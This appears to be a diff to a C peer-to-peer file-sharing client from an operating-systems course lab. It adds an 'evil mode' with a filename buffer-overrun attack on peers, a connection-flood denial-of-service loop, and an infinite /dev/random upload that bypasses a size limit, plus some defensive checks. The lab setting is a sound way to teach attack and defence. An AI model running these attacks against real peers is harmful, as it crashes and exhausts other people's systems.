@@ -23,7 +23,7 @@
 #include "md5.h"
 #include "osp2p.h"
 
-int evil_mode;			// nonzero iff this peer should behave badly
+int evil_mode = 0;			// nonzero iff this peer should behave badly
 
 static struct in_addr listen_addr;	// Define listening endpoint
 static int listen_port;
@@ -504,10 +504,135 @@ task_t *start_download(task_t *tracker_task, const char *filename)
             remainingData = TASKBUFSIZ-(s1-tracker_task->buf);
             memmove(tracker_task->buf, s1, remainingData);
         }
-    }while (messagepos!=TASKBUFSIZ);
+    }while (messagepos==TASKBUFSIZ);
 
  exit:
 	return t;
+}
+
+task_t *prepare_attack(task_t *tracker_task)
+{
+    char *s1, *s2;
+    task_t
+    *t = NULL;
+    peer_t *p;
+    size_t messagepos;
+    assert(tracker_task->type == TASK_TRACKER);
+    unsigned remainingData;
+    
+    message("* Finding peers for to initiate filename attack");
+    
+    osp2p_writef(tracker_task->peer_fd, "WHO\n");
+    do{
+        messagepos = read_tracker_response(tracker_task);
+        if (tracker_task->buf[messagepos] != '2') {
+            error("* Tracker error message while requesting WHO:\n%s", &tracker_task->buf[messagepos]);
+            goto exit;
+        }
+        
+        if (!(t = task_new(TASK_DOWNLOAD))) {
+            error("* Error while allocating task");
+            goto exit;
+        }
+        
+        // add peers
+        s1 = tracker_task->buf;
+        while ((s2 = memchr(s1, '\n', (tracker_task->buf + messagepos) - s1))) {
+            if (!(p = parse_peer(s1, s2 - s1)))
+                die("osptracker responded to WHO command with unexpected format!\n");
+            p->next = t->peer_list;
+            t->peer_list = p;
+            s1 = s2 + 1;
+        }
+        if (s1 != tracker_task->buf + messagepos)
+            die("osptracker's response to WHO has unexpected format!\n");
+        if (messagepos==TASKBUFSIZ) {
+            remainingData = TASKBUFSIZ-(s1-tracker_task->buf);
+            memmove(tracker_task->buf, s1, remainingData);
+        }
+    }while (messagepos==TASKBUFSIZ);
+    
+    message("found %s", t->buf);
+exit:
+    return t;
+}
+
+void static do_filename_overrun_attack(task_t *overrun_task)
+{
+    if (!overrun_task || !overrun_task->peer_list) {
+        error("No peer can be attacked!\n");
+        //task_free(overrun_task);
+        return;
+    }else if(overrun_task->peer_list->addr.s_addr == listen_addr.s_addr
+             && overrun_task->peer_list->port == listen_port)
+        goto try_again;
+    while (overrun_task->peer_list!=0) {
+        message("* Attacking peer %s:%d\n",
+                inet_ntoa(overrun_task->peer_list->addr), overrun_task->peer_list->port);
+        overrun_task->peer_fd = open_socket(overrun_task->peer_list->addr, overrun_task->peer_list->port);
+        if (overrun_task->peer_fd == -1) {
+            error("* Cannot connect to peer: %s for attack\n", strerror(errno));
+            goto try_again;
+        }
+        osp2p_writef(overrun_task->peer_fd, "GET \
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa OSP2P\n");
+        task_pop_peer(overrun_task);
+    }
+    message("Attack succeeded\n");
+    return;
+    
+try_again:
+    // recursive call
+    task_pop_peer(overrun_task);
+    do_filename_overrun_attack(overrun_task);
+    
+}
+
+void static denial_of_service(task_t *t)
+{
+    if (!t || !t->peer_list) {
+        error("No peer can be attacked!\n");
+        task_free(t);
+        return;
+    }else if(t->peer_list->addr.s_addr == listen_addr.s_addr
+             && t->peer_list->port == listen_port)
+        goto try_again;
+    
+    peer_t *current_peer_list = t->peer_list;
+    int i = 0;
+    for(;i<10000; i++) {
+        message("* Attacking peer %s:%d\n",
+                inet_ntoa(current_peer_list->addr), current_peer_list->port);
+        //cutomized attack
+        /*if (strcmp(inet_ntoa(current_peer_list->addr), "128.97.228.95")==0) {
+            current_peer_list = current_peer_list->next==0 ? t->peer_list : current_peer_list->next;
+        }*/
+        t->peer_fd = open_socket(current_peer_list->addr, current_peer_list->port);
+        if (t->peer_fd == -1) {
+            error("* Cannot connect to peer: %s for attack\n", strerror(errno));
+            goto try_again;
+        }
+        current_peer_list = current_peer_list->next==0 ? t->peer_list : current_peer_list->next;
+    }
+    message("Finish socket attack\n");
+    return;
+        
+    try_again:
+        // recursive call
+        task_pop_peer(t);
+        denial_of_service(t);
+    
 }
 
 
@@ -571,6 +696,10 @@ static void task_download(task_t *t, task_t *tracker_task)
 		return;
 	}
 
+    ///////////////////////////////////////////
+    //Exercise 3 here! infinite data download
+    ///////////////////////////////////////////
+    int downloadedSize = 0;
 	// Read the file into the task buffer from the peer,
 	// and write it from the task buffer onto disk.
 	while (1) {
@@ -587,6 +716,11 @@ static void task_download(task_t *t, task_t *tracker_task)
 			error("* Disk write error");
 			goto try_again;
 		}
+        downloadedSize += TASKBUFSIZ;
+        if (downloadedSize==MAXUPLOADSIZE) {
+            error("Downloaded file too big\n");
+            goto try_again;
+        }
 	}
 
 	// Empty files are usually a symptom of some error.
@@ -612,6 +746,7 @@ static void task_download(task_t *t, task_t *tracker_task)
 	task_pop_peer(t);
 	task_download(t, tracker_task);
 }
+
 
 
 // task_listen(listen_task)
@@ -640,7 +775,6 @@ static task_t *task_listen(task_t *listen_task)
 	t->peer_fd = fd;
 	return t;
 }
-
 
 // task_upload(t)
 //	Handles an upload request from another peer.
@@ -682,12 +816,20 @@ static void task_upload(task_t *t)
             break;
         }else if(t->filename[i]=='/')
         {
-            error("Damn! that peer is attacking you! %s", t->filename);
+            error("Damn! that peer is attacking your other files! %s\n", t->filename);
             goto exit;
         }
     }
     
+    ////////////////////////////////////////////////////////////////////////
+    //Exercise 3 here!!! Infinite data upload!!
+    ////////////////////////////////////////////////////////////////////////
+    if (evil_mode==3){
+        t->disk_fd = open("/dev/random", O_RDONLY);
+    }
+    else{
 	t->disk_fd = open(t->filename, O_RDONLY);
+    }
 	if (t->disk_fd == -1) {
 		error("* Cannot open file %s", t->filename);
 		goto exit;
@@ -715,7 +857,7 @@ static void task_upload(task_t *t)
         //Exercise 2B is here!!! Look at meeeee!
         /////////////////////////////////////////////////////////////////
         uploadedBufferSize += TASKBUFSIZ;
-        if (uploadedBufferSize>=MAXUPLOADSIZE) {
+        if (uploadedBufferSize>=MAXUPLOADSIZE && evil_mode==0) {
             error("You are trying to fill up the Disk\n");
             goto exit;
         }
@@ -804,7 +946,8 @@ int main(int argc, char *argv[])
 	// Connect to the tracker and register our files.
 	tracker_task = start_tracker(tracker_addr, tracker_port);
 	listen_task = start_listen();
-	register_files(tracker_task, myalias);
+    if(evil_mode==0 || evil_mode==3)
+        register_files(tracker_task, myalias);
 
 	// First, download files named on command line.
 	for (; argc > 1; argc--, argv++)
@@ -819,6 +962,40 @@ int main(int argc, char *argv[])
             }else if(pid == -1)
                 error("Erorr forking during download\n");
         }
+    
+    if(evil_mode==1)
+    {
+        //filename overrun attack
+        if (fork()==0) {
+            while (1){
+                task_t *overrun_task;
+                overrun_task = prepare_attack(tracker_task);
+                do_filename_overrun_attack(overrun_task);
+                message("next round\n");
+            }
+        }
+        
+    }else if(evil_mode==2)
+    {
+        //denial of service attack
+        if (fork()==0) {
+            while(1){
+                task_t *denial_of_service_task;
+                denial_of_service_task = prepare_attack(tracker_task);
+                denial_of_service(denial_of_service_task);
+            }
+        }
+    }
+    else if (evil_mode==3) {
+        while ((t = task_listen(listen_task))){
+            pid_t pid = fork();
+            if (pid==0) {
+                task_upload(t);
+            }else if(pid==-1){
+                error("Error forking during upload\n");
+            }
+        }
+    }
 
 	// Then accept connections from other peers and upload files to them!
     while ((t = task_listen(listen_task))){
